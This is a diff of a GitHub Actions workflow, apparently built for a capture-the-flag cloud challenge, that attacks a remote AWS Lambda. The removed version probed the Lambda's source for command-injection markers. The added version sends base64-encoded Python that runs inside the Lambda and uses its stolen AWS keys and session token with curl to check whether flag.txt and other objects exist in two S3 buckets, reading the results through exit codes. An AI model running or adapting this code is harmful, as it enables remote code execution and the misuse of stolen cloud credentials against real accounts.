@@ -1,4 +1,4 @@
-name: Stage2-02-Inspect-Deployed-Files
+name: Stage2-03-Curl-S3-Probe
 
 on:
   push:
@@ -9,7 +9,7 @@ permissions:
   contents: read
 
 jobs:
-  inspect:
+  probe:
     runs-on: ubuntu-latest
 
     env:
@@ -23,7 +23,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Inspect deployed files
+      - name: Probe S3 using Lambda curl
         run: |
           python3 - <<'PY'
           import os
@@ -39,54 +39,57 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          tests = {
-              "var_task_exists": r'''
+          tests = [
+              ("userad88e2b168aa387e", "flag.txt"),
+              ("userad88e2b168aa387e", "index.html"),
+              ("userad88e2b168aa387e", "docs.html"),
+              ("logad88e2b168aa387e", "flag.txt"),
+              ("logad88e2b168aa387e", "index.html"),
+              ("logad88e2b168aa387e", "docs.html")
+          ]
+
+          for bucket, key in tests:
+              code = f'''
           import os
-          raise SystemExit(7 if os.path.isdir("/var/task") else 9)
-          ''',
+          import subprocess
 
-              "lambda_file_exists": r'''
-          import os
-          raise SystemExit(7 if os.path.isfile("/var/task/lambda_function.py") else 9)
-          ''',
+          url = "https://s3.us-east-1.amazonaws.com/{bucket}/{key}"
 
-              "lambda_source_markers": r'''
-          import os
+          command = [
+              "curl",
+              "--silent",
+              "--show-error",
+              "--head",
+              "--aws-sigv4",
+              "aws:amz:us-east-1:s3",
+              "--user",
+              os.environ["AWS_ACCESS_KEY_ID"] + ":" + os.environ["AWS_SECRET_ACCESS_KEY"],
+              "-H",
+              "x-amz-security-token: " + os.environ["AWS_SESSION_TOKEN"],
+              url
+          ]
 
-          try:
-              path = "/var/task/lambda_function.py"
+          result = subprocess.run(
+              command,
+              stdout=subprocess.PIPE,
+              stderr=subprocess.PIPE,
+              text=True
+          )
 
-              if not os.path.isfile(path):
-                  raise SystemExit(9)
+          output = result.stdout + result.stderr
 
-              with open(path, "rb") as handle:
-                  data = handle.read(65536).lower()
+          if " 200 " in output or " 206 " in output:
+              raise SystemExit(7)
 
-              markers = [
-                  b"subprocess",
-                  b"shell=true",
-                  b"nslookup",
-                  b"lambda_handler",
-                  b"domain = event.get"
-              ]
+          if " 403 " in output or "AccessDenied" in output:
+              raise SystemExit(10)
 
-              matches = sum(marker in data for marker in markers)
-              raise SystemExit(20 + matches)
+          if " 404 " in output or "NoSuchKey" in output:
+              raise SystemExit(12)
 
-          except SystemExit:
-              raise
-
-          except Exception:
-              raise SystemExit(19)
-          ''',
-
-              "opt_directory": r'''
-          import os
-          raise SystemExit(7 if os.path.isdir("/opt") else 9)
+          raise SystemExit(19)
           '''
-          }
 
-          for name, code in tests.items():
               encoded = base64.b64encode(code.encode()).decode()
 
               response = requests.post(
@@ -96,7 +99,7 @@ jobs:
                   timeout=40
               )
 
-              print(f"TEST={name}")
+              print(f"BUCKET={bucket} KEY={key}")
               print(response.text)
               print("---")
           PY
